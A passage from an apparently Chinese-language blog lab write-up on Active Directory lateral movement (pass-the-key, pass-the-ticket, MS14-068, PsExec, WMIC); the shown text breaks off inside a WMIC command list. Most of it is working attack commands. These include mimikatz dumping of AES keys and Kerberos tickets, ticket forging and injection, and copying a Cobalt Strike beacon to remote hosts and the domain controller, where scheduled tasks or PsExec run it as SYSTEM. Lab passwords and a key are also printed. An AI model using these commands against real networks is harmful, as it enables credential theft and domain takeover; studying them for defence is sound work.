class="hljs-number">10.210</span>.<span class="hljs-number">100.20</span> <span class="hljs-regexp">/tn r1cky /</span>sc onstart <span class="hljs-regexp">/tr c:\artifact.exe /</span>ru system /<br><span class="hljs-number">3</span>.执行计划任务<br>schtasks <span class="hljs-regexp">/run /</span>s <span class="hljs-number">10.210</span>.<span class="hljs-number">100.20</span> <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;r1cky&quot;</span><br></code></pre></td></tr></table></figure><p>方式二：利用cs自带的功能：</p><p><img src="/img/image-20231017174239984.png" alt="image-20231017174239984"> </p><p><img src="/img/image-20231017174447338.png" alt="image-20231017174447338"></p><p><img src="/img/image-20231017174514844.png" alt="image-20231017174514844"> </p><h2 id="9-pass-the-key-密钥传递攻击-PTK-横向攻击"><a href="#9-pass-the-key-密钥传递攻击-PTK-横向攻击" class="headerlink" title="9.pass the key 密钥传递攻击(PTK)横向攻击"></a>9.pass the key 密钥传递攻击(PTK)横向攻击</h2><h3 id="PTK介绍"><a href="#PTK介绍" class="headerlink" title="PTK介绍"></a>PTK介绍</h3><p>WinXP&#x2F;2003&#x2F;Vista&#x2F;2008 ，以及未打 KB2871997 补丁之前的 Win7&#x2F;2008r2&#x2F;8&#x2F;2012，这些环境我们都可以使用NTLM哈希传递 </p><p>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012，可以使用AES keys代替NTLM来进行验证</p><h3 id="什么是KB2871997"><a href="#什么是KB2871997" class="headerlink" title="什么是KB2871997"></a>什么是KB2871997</h3><p>KB2871997：<strong>禁止本地管理员账户用于远程连接</strong>，这样就无法以本地管理员用户的权限执行wmi、 psexec、schtasks、at和访问文件共享。</p><p>这个补丁发布后常规的Pass The Hash已经无法成功，<strong>唯独默认的 Administrator (SID 500)账号例外</strong>， <strong>利用这个账号仍可以进行Pass The Hash远程连接，即使administrator修改了名字</strong></p><p>但是还可以通过AES密钥来替代NTLM验证进行横向的操作，其实这个补丁挺鸡肋的，不用AES密钥照样也可以用NTLM，只是需要Administrator（SID 500），都拿到机器了，Administrator还不容易吗？这个补丁唯一的好处就是减少存储在内存中的凭据数据，也就是让wdigest协议认证的凭据不会存储在 lsass.exe，这样子当你dump lsass.exe的时候你就会发现，wdigest协议中的凭据你就看不到了！</p><h3 id="实验复现"><a href="#实验复现" class="headerlink" title="实验复现"></a>实验复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><table><thead><tr><th>机器名</th><th>系统</th><th>登录用户</th><th></th></tr></thead><tbody><tr><td>域内主机(winserver2012-2)</td><td>winServer2012R2</td><td>本地管理员admin</td><td>10.210.100.12</td></tr><tr><td>域内主机(winserver2012- 1)</td><td>winServer2012R2</td><td>本地管理员 administrator</td><td>10.210.100.11</td></tr><tr><td>域控（DC）</td><td>winServer2012R2</td><td>域管administrator</td><td>10.210.100.10</td></tr></tbody></table><h4 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h4><p>已经控制了2012-2主机，发现他是admin用户登录系统，<strong>通过抓取密码发现域管账号(hack\administrator)存在内存中,即在这台主机上登陆过</strong>，但是没有明文，PTH攻击也失效，这个时候采用PTK攻击</p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>使用钓鱼或者其他的方式进行远控</p><p>绕过uac 使用CS插件（欧拉插件）</p><p><img src="/img/image-20231018151327040.png" alt="image-20231018151327040"> </p><h5 id="小tip，CS加载插件出现乱码解决办法"><a href="#小tip，CS加载插件出现乱码解决办法" class="headerlink" title="小tip，CS加载插件出现乱码解决办法"></a><strong>小tip，CS加载插件出现乱码解决办法</strong></h5><p><a href="https://blog.csdn.net/weixin_44309905/article/details/122687310">https://blog.csdn.net/weixin_44309905/article/details/122687310</a></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">java  -<span class="hljs-title class_">Dfile</span>.encoding=utf-<span class="hljs-number">8</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:ParallelGCThreads=</span><span class="hljs-number">4</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+AggressiveHeap</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseParallelGC</span> -<span class="hljs-title class_">Xms512</span>M -<span class="hljs-title class_">Xmx1024</span>M -jar cobaltstrike.jar<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231018151411948.png" alt="image-20231018151411948"></p><p>抓取密码（此时无法执行读取密码等操作）</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz privilege::debug<br>mimikatz sekurlsa::ekeys<br></code></pre></td></tr></table></figure><p><strong>在2012-2本地管理员admin用户下没有抓到域管的aes，测试失败,直接登录域管才抓到</strong></p><p>试了很久之后 admin账户也抓到了。。。。。</p><p>域管账户抓的：</p><p><img src="/img/image-20231019153446086.png" alt="image-20231019153446086"></p><p>admin账户抓的：</p><p><img src="/img/image-20231019171620158.png" alt="image-20231019171620158"></p><p><strong>administrator:8ae04f63bb11d4eccbaa76c8fe667b34b59fced44b05227b9375af63801cf5b3</strong></p><p>传递key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz sekurlsa::pth /user:administrator /domain:hack.com /aes256:8ae04f63bb11d4eccbaa76c8fe667b34b59fced44b05227b9375af63801cf5b3<br></code></pre></td></tr></table></figure><p><strong>注：登录域管账号可以抓</strong></p><p><img src="/img/image-20231019163842189.png" alt="image-20231019163842189"> </p><p>jack:6e1d96f65964a1b98d297e0f542fe9d62cfb3e8f9410190a4e54a67474f99afe</p><p>登录普通域账号需要绕过uac，cs好像没绕过，需要到电脑桌面进行操作</p><p><img src="/img/image-20231019170154561.png" alt="image-20231019170154561"></p><p>成功的话在2012-2会弹出cmd，可执行dir \\dc.hack.com\c$测试</p><p><img src="/img/image-20231019171736001.png" alt="image-20231019171736001"> </p><p>登录到机器然后执行命令上线</p><p>计划任务等等之类的</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">net use \\<span class="hljs-number">2012</span>-<span class="hljs-number">1</span>.hack.<span class="hljs-keyword">com</span><br><span class="hljs-keyword">copy</span> C:\Users\admin\Desktop\artifact.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">2012</span>-<span class="hljs-number">1</span>.hack.<span class="hljs-keyword">com</span>\C$<br>schtasks /create /s <span class="hljs-number">2012</span>-<span class="hljs-number">1</span>.hack.<span class="hljs-keyword">com</span> /<span class="hljs-keyword">tn</span> test /sc onstart /<span class="hljs-keyword">tr</span> <span class="hljs-keyword">c</span>:\artifact.<span class="hljs-keyword">exe</span> /<span class="hljs-keyword">ru</span> <span class="hljs-built_in">system</span> /<span class="hljs-keyword">f</span><br>schtasks /run /s <span class="hljs-number">2012</span>-<span class="hljs-number">1</span>.hack.<span class="hljs-keyword">com</span> /i /<span class="hljs-keyword">tn</span> <span class="hljs-comment">&quot;test</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019153413162.png" alt="image-20231019153413162"></p><h2 id="10-pass-the-ticket-票据传递攻击-PTT-横向攻击"><a href="#10-pass-the-ticket-票据传递攻击-PTT-横向攻击" class="headerlink" title="10.pass the ticket 票据传递攻击(PTT)横向攻击"></a>10.pass the ticket 票据传递攻击(PTT)横向攻击</h2><h3 id="票据传递介绍"><a href="#票据传递介绍" class="headerlink" title="票据传递介绍"></a>票据传递介绍</h3><p>要想使用mimikatz的哈希传递功能,必须具有本地管理员权限。 mimikatz同样提供了不需要 本地管理员 权限进行 横向渗透测试的方法, </p><p>例如票据传递( PassThe Ticket,PTT)</p><p>票据传递是基于kerberos认证的一种攻击方式，常用来做后渗透权限维持。 </p><p><strong>黄金票据攻击利用的前提是得到了域内krbtgt用户的NTLM哈希或AES-256的值。</strong> </p><p><strong>白银票据攻击利用的前提是得到了域内服务账号的HTML哈希或AES-256的值。</strong> </p><p>票据传递攻击一般分为两种 </p><p>1、自己制作票据 </p><p>2、传递内存中的票据</p><h3 id="实验复现-1"><a href="#实验复现-1" class="headerlink" title="实验复现"></a>实验复现</h3><p>导出内存的票据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>执行以上命令后,会在当前目录下出现多个服务的票据文件,例如krbtgt、cifs、ldap等。</p><p>这里的admin在CS上执行能导出，但是看不到这些文件</p><img src="/img/image-20231019172653999.png" alt="image-20231019172653999" style="zoom:67%;" /><p>只能到电脑上看</p><p><img src="/img/image-20231019172556496.png" alt="image-20231019172556496"></p><p> 清除内存中的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist purge<br>mimikatz kerberos::purge<br>两个都是清除票据<br></code></pre></td></tr></table></figure><p>将高权限的票据文件注入内存</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mimikatz kerberos::ptt [0;63c03]<span class="hljs-string">-2</span><span class="hljs-string">-1</span><span class="hljs-string">-40</span>e10000-Administrator@krbtgt-HACK.COM.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019172804268.png" alt="image-20231019172804268"></p><p>查看票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist<br>mimikatz kerberos::tgt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019172913750.png" alt="image-20231019172913750"></p><p>访问机器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">2012</span>-<span class="hljs-number">1</span>.hack.com\c$<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019172956060.png" alt="image-20231019172956060"></p><p>上线域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> net use \\dc.hack.com</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> copy C:\Users\admin\Desktop\artifact.exe \\dc.hack.com\C$</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru</span><br>system /f<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br>删除计划任务：<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /delete /s IP地址 /tn <span class="hljs-string">&quot;计划任务名&quot;</span> /f</span><br>删除连接：<br>net use \\IP /del /y<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019173251549.png" alt="image-20231019173251549"></p><h2 id="11-PTT攻击之ms14-068传递获取域管横向"><a href="#11-PTT攻击之ms14-068传递获取域管横向" class="headerlink" title="11.PTT攻击之ms14-068传递获取域管横向"></a>11.PTT攻击之ms14-068传递获取域管横向</h2><h3 id="MS14-068介绍"><a href="#MS14-068介绍" class="headerlink" title="MS14-068介绍"></a>MS14-068介绍</h3><p>ms14-068漏洞主要通过伪造域管的TGT，将普通用户权限提权为域管权限，以此来控制域控。只要服务器未打ms14-068补丁（KB3011780），在server 2000以上的域控服务器中，都可进行利用</p><h3 id="MS14-068的利用条件"><a href="#MS14-068的利用条件" class="headerlink" title="MS14-068的利用条件"></a>MS14-068的利用条件</h3><p>1、获取域普通用户的账号密码 </p><p>2、获取域普通用户的sid </p><p>3、服务器未打KB3011780补丁</p><h3 id="MS14-068实验"><a href="#MS14-068实验" class="headerlink" title="MS14-068实验"></a>MS14-068实验</h3><p>环境介绍</p><p>域控：10.210.100.10 windows server 2012 </p><p>域内机器：10.210.100.12 winserver2012 rose 域内用户</p><p>MS14-068利用</p><p>查看域用户的SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><img src="/img/image-20231019222954937.png" alt="image-20231019222954937" style="zoom:80%;" /> <p>SID：S-1-5-21-2431442348-1717482385-2017137259-1117</p><img src="/img/image-20231019230051255.png" alt="image-20231019230051255" style="zoom:80%;" /> <p>SID:S-1-5-21-2431442348-1717482385-2017137259-1121</p><p>清除内存中的票据</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist purge</span><br></code></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控<br><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u rose@hack.com -p Admin123 -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2431442348</span>-<span class="hljs-number">1717482385</span>-<span class="hljs-number">2017137259</span>-<span class="hljs-number">1117</span> -d DC.hack.com<br><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u r1cky@hack.com -p Admin123 -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2431442348</span>-<span class="hljs-number">1717482385</span>-<span class="hljs-number">2017137259</span>-<span class="hljs-number">1121</span> -d DC.hack.com<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019223449062.png" alt="image-20231019223449062"></p><img src="/img/image-20231019223529944.png" alt="image-20231019223529944" style="zoom:80%;" /> <p>导入票据</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kerberos::ptc 票据名字<br>mimikatz kerberos::ptc <span class="hljs-title class_">TGT_rose</span><span class="hljs-variable">@hack</span>.com.ccache<br>mimikatz kerberos::ptc <span class="hljs-title class_">TGT_r1cky</span><span class="hljs-variable">@hack</span>.com.ccache<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231019223752018.png" alt="image-20231019223752018"></p><p>执行命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc2.test.com\c<span class="hljs-variable">$</span> 注意是机器名不是IP<br></code></pre></td></tr></table></figure><p>测试失败：系统无法联系域控制器来为身份验证请求提供服务。请稍后再试。</p><img src="/img/image-20231019231448716.png" alt="image-20231019231448716" style="zoom:80%;" /> <p>如能连接成功  即重复之前的操作</p><p>建立网络连接</p><p>复制恶意文件</p><p>添加计划任务</p><p>启动计划任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s dc.hack.com <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><p>上线DC</p><p><strong>之后可以换2008作为域控再次测试</strong></p><h3 id="goldenPac-exe"><a href="#goldenPac-exe" class="headerlink" title="goldenPac.exe"></a>goldenPac.exe</h3><p>此工具是impacket工具包里的，它是MS14-068+psexec的组合，因此使用起来非常放方便快捷 </p><p>用法：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">goldenPac.exe 域名/域用户名：域用户明文密码<span class="hljs-meta">@域控完整域名</span><br></code></pre></td></tr></table></figure><p>测试失败，可能是由于2012打了KB3011780补丁</p><p><img src="/img/image-20231019232232228.png" alt="image-20231019232232228"></p><h2 id="12-PsExec工具远程命令执行横向移动"><a href="#12-PsExec工具远程命令执行横向移动" class="headerlink" title="12.PsExec工具远程命令执行横向移动"></a>12.PsExec工具远程命令执行横向移动</h2><h3 id="PsExec介绍"><a href="#PsExec介绍" class="headerlink" title="PsExec介绍"></a>PsExec介绍</h3><p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口， 只需要对方开启admin$共享和ipc$ (该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防 火墙（防火墙禁止445端口连接），psexec也是不能使用的，会提示找不到网络路径。由于psexec是 Windows提供的工具，所以杀毒软件将其列在白名单中</p><p>下载地址 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h3 id="PsExec使用条件"><a href="#PsExec使用条件" class="headerlink" title="PsExec使用条件"></a>PsExec使用条件</h3><p>1、具有正确的凭证（内存凭证、账号密码、账号NTLM Hash）</p><p>2、能建立IPC链接（也就是需要通过smb认证的），且目标机器开启了共享（默认开启的），并且目标共享中必须有admin$共享</p><h3 id="PsExec常用参数"><a href="#PsExec常用参数" class="headerlink" title="PsExec常用参数"></a>PsExec常用参数</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">psexec <span class="hljs-string">\\ip</span> -u administrator -p admin cmd 进⼊半交互式shell<br>PsExec -accepteula <span class="hljs-string">\\192.168.108.101</span> -s cmd.exe 建立交互的shell<br>psexec <span class="hljs-string">\\ip</span> - uadministrator -p admin -w c:<span class="hljs-string">\cmd</span> 进⼊交互式shell，且c:<span class="hljs-string">\是⽬标机器的⼯</span><br>作⽬录<br>psexec <span class="hljs-string">\\ip</span> -u administrator -p admin whoami all 执行命令<br>psexec <span class="hljs-string">\\ip</span> -u administrator -p admin -d c:<span class="hljs-string">\beacon.exe</span> 执行文件<br>psexec <span class="hljs-string">\\ip</span> -u administrator -p admin -h -d c:<span class="hljs-string">\beacon.exe</span> UAC的⽤⼾权限执行文件<br></code></pre></td></tr></table></figure><h3 id="实验复现-2"><a href="#实验复现-2" class="headerlink" title="实验复现"></a>实验复现</h3><p>测试机器  pc-2008 r1cky</p><p>直接使用：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsExec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span> -u administrator -<span class="hljs-selector-tag">p</span> Admin123 -s cmd<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020160543557.png" alt="image-20231020160543557"></p><h4 id="IPC-下的psexec"><a href="#IPC-下的psexec" class="headerlink" title="IPC$下的psexec"></a>IPC$下的psexec</h4><p>上传psexec</p><p>建立IPC$连接</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">删除连接：<span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del /y<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.210.100.12\ipc$ <span class="hljs-string">&quot;Admin123&quot;</span> /user:administrator<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020160744368.png" alt="image-20231020160744368"></p><p>返回交互的shell或者执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">psexec.<span class="hljs-keyword">exe</span> -accepteula \\<span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span> -s cmd.<span class="hljs-keyword">exe</span> 返回交互<span class="hljs-keyword">shell</span>（必须是msf或者远程<br>到桌面 CS不行）<br>psexec.<span class="hljs-keyword">exe</span> -accepteula \\<span class="hljs-number">10.210</span>.<span class="hljs-number">100.12</span> -s ipconfig 远程执行命令<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020163828414.png" alt="image-20231020163828414"></p><p>远程复制</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">copy C:<span class="hljs-string">\Users\r1cky\Desktop\r1.exe</span> <span class="hljs-string">\\10.210.100.12\C$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020164333498.png" alt="image-20231020164333498"></p><p>远程上线</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PsExec.exe -accepteula <span class="hljs-string">\\10.210.100.12</span> -h -d c:<span class="hljs-string">\r1.exe</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020164325038.png" alt="image-20231020164325038"></p><p><img src="/img/image-20231020164347146.png" alt="image-20231020164347146"></p><h4 id="PTH下的psexec"><a href="#PTH下的psexec" class="headerlink" title="PTH下的psexec"></a>PTH下的psexec</h4><p>拿下10.210.100.30 pc-2003</p><p>找到登录的凭证</p><img src="/img/image-20231020165440561.png" alt="image-20231020165440561" style="zoom:80%;" /> <p>进行psexec攻击上线 填写信息上线</p><p><img src="/img/image-20231020165509417.png" alt="image-20231020165509417"></p><p>上线：</p><p><img src="/img/image-20231020165547770.png" alt="image-20231020165547770"></p><h4 id="PTT下的psexec"><a href="#PTT下的psexec" class="headerlink" title="PTT下的psexec"></a>PTT下的psexec</h4><p>使用pc-2012(登陆过域控)</p><p><img src="/img/image-20231020173027343.png" alt="image-20231020173027343"></p><p>上传psexec</p><p>进行PTT攻击  导出内存的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">查看密码：mimikatz sekurlsa::ekeys<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231020173343153.png" alt="image-20231020173343153" style="zoom:80%;" /> <p>CS中显示不出来</p><p>清除内存中的票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist purge<br>mimikatz kerberos::purge<br>两个都是清除票据<br></code></pre></td></tr></table></figure><p>将高权限的票据文件注入内存</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mimikatz kerberos::ptt [0;11bff0]<span class="hljs-string">-2</span><span class="hljs-string">-0</span><span class="hljs-string">-40</span>e10000-Administrator@krbtgt-HACK.COM.kirbi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020173527650.png" alt="image-20231020173527650"></p><p>查看票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist<br>mimikatz kerberos::tgt<br></code></pre></td></tr></table></figure><p>远程复制</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">copy <span class="hljs-name">C</span>:\Users\admin\Desktop\artifact.exe \\dc.hack.com\C$<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020173743149.png" alt="image-20231020173743149"></p><p>远程上线</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsExec<span class="hljs-selector-class">.exe</span> \\dc<span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span> -h -d c:\wanli.exe<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231020173901853.png" alt="image-20231020173901853"></p><p><img src="/img/image-20231020173908127.png" alt="image-20231020173908127"></p><h2 id="13-wmic-远程执行命令横向移动"><a href="#13-wmic-远程执行命令横向移动" class="headerlink" title="13.wmic 远程执行命令横向移动"></a>13.wmic 远程执行命令横向移动</h2><h3 id="什么是WMI"><a href="#什么是WMI" class="headerlink" title="什么是WMI"></a>什么是WMI</h3><p>WMI是Windows在Powershell还未发布前，微软用来管理Windows系统的重要数据库工具，WMI本身的组织架构是一个数据库架构，WMI 服务使用 DCOM或 WinRM 协议,自从 PsExec 在内网中被严格监控后，越来越多的反病毒厂商将 PsExec 加入了黑名单，于是黑客们渐渐开始使用 WMI 进行横向移动。通过渗透测试发现，在使用 wmiexec 进行横向移动时，windows 操作系统默认不会将 WMI 的操 作记录在日志中。因此很多 APT 开始使用 WMI 进行攻击。<strong>WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具） ，提供了从命令行接口和批处理脚本执行系统管理的支持</strong>。 </p><p>简单来说：<strong>wmic就是wmic.exe，位于windows目录底下，是一个命令行程序</strong>。WMIC可以以两种模式执行：交互模式(Interactive mode)和非交互模式(Non-Interactive mode)，WMI就是 Windows Management Instrumentation（Windows 管理规范）。它是 Windows 中的一个核心管理技术。</p><h3 id="WMIC常见命令"><a href="#WMIC常见命令" class="headerlink" title="WMIC常见命令"></a>WMIC常见命令</h3><p>wmic命令需要本地管理员或域管理员才可以进行正常使用，普通权限用户若想要使用wmic，可以修改普通用户的ACL，不过修改用户的ACL也需要管理员权限，普通用户使用wmic。以下命令均在 2008R2、2012R2、2016上进行测试,部分命令在虚拟机中测试不行。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic logon list brief 登录⽤户<br>wmic ntdomain list brief 域控机器<br>wmic useraccount list brief ⽤户列表<br>wmic share <span class="hljs-built_in">get</span> name,path 查看系统共享<br>wmic<span class="hljs-built_in"> service </span>list brief |more 服务列表<br>wmic startup list full 识别开机启动的程序，包括路径<br>wmic fsdir <span class="hljs-string">&quot;c:\\test&quot;</span> call delete 删除C盘下的test目录<br>wmic nteventlog <span class="hljs-built_in">get</span> path,filename,writeable 查看系统中开启的⽇志<br>wmic nicconfig <span class="hljs-built_in">get</span> ipaddress,macaddress 查看系统中⽹卡的IP地址和MAC地址<br>wmic qfe <span class="hljs-built_in">get</span> description,installedOn 使⽤wmic识别安装到系统中的补丁情况<br>wmic product <span class="hljs-built_in">get</span> name,version 查看系统中安装的软件以及版本，2008R2上执行后无反应。<br>wmic useraccount where <span class="hljs-string">&quot;name=&#x27;%UserName%&#x27;&quot;</span> call rename newUserName 更改当前用户名<br>wmic useraccount where <span class="hljs-string">&quot;name=&#x27;Administrator&#x27;&quot;</span> call Rename admin 更改指定用户名<br>wmic bios list full | findstr /i <span class="hljs-string">&quot;vmware&quot;</span> 查看当前系统是否是VMWARE，可以按照实际情况进<br>行筛选<br>wmic desktop <span class="hljs-built_in">get</span> screensaversecure,screensavertimeout 查看当前系统是否有屏保保护，延<br>迟是多少<br>wmic process where <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;vmtoolsd.exe&quot;</span> <span class="hljs-built_in">get</span> executablepath 获取指定进程可执行文件的路<br>径<br>wmic environment where <span class="hljs-string">&quot;name=&#x27;temp&#x27;&quot;</span> <span class="hljs-built_in">get</span> UserName,VariableValue 获取temp环境变量<br>查询当前主机的杀毒软件<br>wmic process where <span class="hljs-string">&quot;name like 